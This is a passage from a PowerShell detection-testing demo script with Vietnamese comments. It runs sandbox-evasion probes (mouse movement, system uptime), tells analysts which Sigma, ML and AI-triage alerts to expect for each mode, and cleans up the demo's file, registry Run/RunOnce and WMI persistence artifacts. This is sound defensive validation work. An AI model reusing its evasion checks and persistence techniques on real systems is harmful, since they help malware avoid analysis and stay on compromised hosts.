Write-Host 'Sandbox probe — Mouse moved in 200ms:' `$moved

# Check 5 — Uptime (sandbox thường mới boot)
`$uptime = (Get-Date) - (Get-CimInstance Win32_OperatingSystem).LastBootUpTime
Write-Host 'Sandbox probe — Uptime hours:' ([math]::Round(`$uptime.TotalHours, 1))
"@

        if ($Mode -in "baseline","chain") {
            Write-Action "Sandbox probe BASELINE (literal keywords)" "Sigma catch combination of indicators"
        }
        else {
            Write-Action "Sandbox probe EVASION variant" "Same indicators, ScriptBlock gets logged anyway"
        }
        Invoke-If { try { $sb = [scriptblock]::Create($scriptText); & $sb } catch { } }
    }
}

# ============================================================
# Summary
# ============================================================
Write-Host ""
Write-Host "+================================================================+" -ForegroundColor Green
Write-Host "|  Demo done - check Kibana / Velociraptor                       |" -ForegroundColor Green
Write-Host "+================================================================+" -ForegroundColor Green
Write-Host ""
Write-Host "  Mode    : $Mode"
Write-Host "  RunId   : $RunId"
Write-Host "  Marker  : ${DemoTag}_PHASE*_$RunId"
Write-Host ""
Write-Host "  Search trong Kibana:"
Write-Host "    1. logs-winlog* -> tìm theo RunId '$RunId'"
Write-Host "       (Sysmon EID 1/11/13/22 + PS 4104; WMI 19/20/21 nếu chain/noisy)"

# Kỳ vọng Sigma & RED tùy Mode — không hard-code 1 câu cho mọi mode
switch ($Mode) {
    "benign" {
        Write-Host "    2. Security/Alerts -> KHÔNG có alert mới (đối chứng FP)"
        Write-Host "    3. red-alerts*     -> KHÔNG có RED alert (đối chứng FP)"
    }
    "baseline" {
        Write-Host "    2. Security/Alerts -> Sigma cứng FIRE rule chuẩn"
        Write-Host "       VD: 'SIGMA - CurrentVersion Autorun Keys Modification'"
        Write-Host "    3. red-alerts*     -> RED ML score ≈ 1.0 (cùng rule với Sigma)"
    }
    "evasion" {
        if ($IncludeNoisySigma) {
            Write-Host "    2. Security/Alerts -> Sigma sẽ FIRE noisy techniques đã bật"
            Write-Host "       (-e child PS / WMI / LOLBins dùng để show defense-in-depth)"
        }
        else {
            Write-Host "    2. Security/Alerts -> Sigma-low evasion: đã bỏ child -e, WMI loop, LOLBins"
            Write-Host "       Nếu chạy qua SSH vẫn có thể thấy SSH parent/non-interactive alerts."
        }
        Write-Host "    3. red-alerts*     -> RED ML catch obfuscation/marker variants ✅"
    }
    "chain" {
        Write-Host "    2. Security/Alerts -> Sigma FIRE phần baseline, MISS phần evasion"
        Write-Host "    3. red-alerts*     -> RED ML catch CẢ baseline + evasion ✅"
    }
}
Write-Host "    4. ai-investigations -> AI Agent (8-agent) triage report tiếng Việt"
Write-Host ""
Write-Host "  Verify khớp rule giữa Sigma Kibana & RED:"
Write-Host "    field 'top_rule_sigma_id' (UUID) trong red-alerts ↔ rule UUID trong"
Write-Host "    Security/Rules. Cùng UUID = cùng rule (chỉ format hiển thị khác)."

if (-not $DryRun) {
    # Auto-cleanup sau $SleepSeconds + 60s (đủ thời gian cho Forensic Agent query)
    $cleanupBlock = {
        param($Tag, $RunIdArg, $Sleep, $WmiFilter, $WmiConsumer)
        Start-Sleep -Seconds ($Sleep + 60)

        # Files
        Remove-Item "C:\Users\Public\xkj9_demo_$RunIdArg.exe" -Force -ErrorAction SilentlyContinue
        Remove-Item "C:\Users\Public\mshta_marker_$RunIdArg.txt" -Force -ErrorAction SilentlyContinue

        # Registry Run / RunOnce
        foreach ($key in @("HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run",
                           "HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce")) {
            $names = (Get-Item $key -ErrorAction SilentlyContinue |
                      Select-Object -ExpandProperty Property) |
                     Where-Object { $_ -like "${Tag}_*_$RunIdArg" }
            foreach ($n in $names) {
                Remove-ItemProperty -Path $key -Name $n -ErrorAction SilentlyContinue
            }
        }

        # WMI persistence
        Get-WmiObject -Namespace root\subscription -Class __EventFilter -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $WmiFilter } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class CommandLineEventConsumer -ErrorAction SilentlyContinue |
            Where-Object { $_.Name -eq $WmiConsumer } | Remove-WmiObject -ErrorAction SilentlyContinue
        Get-WmiObject -Namespace root\subscription -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue |
            Where-Object { $_.Filter -match $WmiFilter } | Remove-WmiObject -ErrorAction SilentlyContinue
    }
    Start-Job -ScriptBlock $cleanupBlock `
        -ArgumentList $DemoTag, $RunId, $SleepSeconds, $WmiFilterName, $WmiConsumerName | Out-Null
    Write-Host ""
    Write-Host "  Auto-cleanup sau $($SleepSeconds + 60) giây (files/RunOnce/WMI nếu có)." -ForegroundColor DarkGray
}

Write-Host ""
